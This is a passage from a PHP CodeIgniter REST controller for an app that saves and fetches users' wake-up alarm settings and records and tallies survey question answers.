                    "repeatDays" => isset($_POST['repeatDays']) ? $_POST['repeatDays'] : "False",
                    "user_id" => $_POST['user_id']
                );
                $response = array(
                    "status" => TRUE,
                    "msg" => "Wake Up Saved",
                    "result" => $insert_arr
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Something went wrong",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function fetch_wake_up_saved_post() {
        
        
        if ($_POST['user_id']) {
            $saved_data = $this->ApiModel->get_wake_up_saved_data($_POST['user_id']);
            if ($saved_data) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Wake Up Saved Data",
                    "result" => [
                        "gender" => (($saved_data[0]['gender'] == 'None') ? 'False' :$saved_data[0]['gender']),
                        "program" => (($saved_data[0]['program'] == 'None') ? 'False' :$saved_data[0]['program']),
                        "thumbURL" => (($saved_data[0]['thumbURL'] == 'None') ? 'False' :$saved_data[0]['thumbURL']),
                        "videoURL" => (($saved_data[0]['videoURL'] == 'None') ? 'False' :$saved_data[0]['videoURL']),
                        "time" => (($saved_data[0]['time'] == 'None') ? 'False' :$saved_data[0]['time']),
                        "repeatDays" => (($saved_data[0]['repeatDays'] == 'None') ? 'False' :$saved_data[0]['repeatDays'])
                    ]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, data not found",
                    "result" => new stdClass()
                );
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    function getPercentage_qa($qid, $aid) {
        $count = 0;
        $qList = $this->ApiModel->get_question_answer_response($qid);
        foreach ($qList as $val) {
            $questionIndex = array_search($qid,explode(',', $val['question_id']),true);
            $a_arr = explode(',', $val['answer']);
            if ($a_arr[$questionIndex] == $aid) {
                $count++;
            }

        }

        return $count;

    }

    public function fetch_question_list_get() {
        $questionList = $this->ApiModel->get_questions();
        $answerList = $this->ApiModel->get_answers();
        if ($questionList) {
            $list = [];
            $counter = 0;
            foreach ($questionList as $qData) {
                $list[$counter]['question_id'] = $qData['id'];
                $list[$counter]['question'] = $qData['question'];
                $aCounter = 0;
                foreach ($answerList as $aData) {
                    $list[$counter]['answers'][$aCounter]['answer_id'] = $aData['id'];
                    $list[$counter]['answers'][$aCounter]['answer'] = $aData['answer'];
                    $list[$counter]['answers'][$aCounter++]['percentage'] = $this->getPercentage_qa($qData['id'], $aData['id']);
                }
                $counter++;
            }

            if ($list) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Question answer list",
                    "result" => ["list"=>$list]
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, no data found",
                    "result" => new stdClass()
                );
            }

        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, no data found",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }

    public function save_q_answer_post() {
        if ($_POST['user_id'] && $_POST['question_ids'] && $_POST['answer']) {
            $insertArr = array(
                "question_id" => $_POST['question_ids'],
                "answer" => $_POST['answer'],
                "user_id" => $_POST['user_id'],
                "created_at" => date("Y-m-d H:i:s")
            );
            if ($this->ApiModel->insert_q_a($insertArr)) {
                $response = array(
                    "status" => TRUE,
                    "msg" => "Value inserted successfully",
                    "result" => new stdClass()
                );
            } else {
                $response = array(
                    "status" => FALSE,
                    "msg" => "Oops!, something went wrong",
                    "result" => new stdClass()
                );    
            }
        } else {
            $response = array(
                "status" => FALSE,
                "msg" => "Oops!, fields missing",
                "result" => new stdClass()
            );
        }

        $this->response($response, REST_Controller::HTTP_OK);
    }
   
}